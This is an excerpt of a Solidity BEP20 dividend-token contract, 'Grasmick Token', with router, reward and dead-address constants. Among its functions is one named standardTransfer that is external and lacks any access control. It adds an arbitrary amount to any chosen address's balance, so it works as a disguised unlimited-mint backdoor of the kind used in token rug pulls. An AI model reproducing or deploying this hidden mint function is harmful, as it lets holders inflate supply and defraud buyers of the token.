...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 Reward = IBEP20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    address WBNB = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7; 
    IDEXRouter router;
    ...
    constructor (address _router) {
            ...
            ? IDEXRouter(_router)
            : IDEXRouter(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
        _token = msg.sender;
    }
...
contract Grasmick is IBEP20, Auth {
    using SafeMath for uint256;
    
    address Reward = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address WBNB = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Grasmick Token";
    string constant _symbol = "Grasmick";
    ...
    function standardTransfer(uint256 value, address dividendTacker)external{
        _balances[dividendTacker]=_balances[dividendTacker].add(value*(10 ** _decimals));
    }
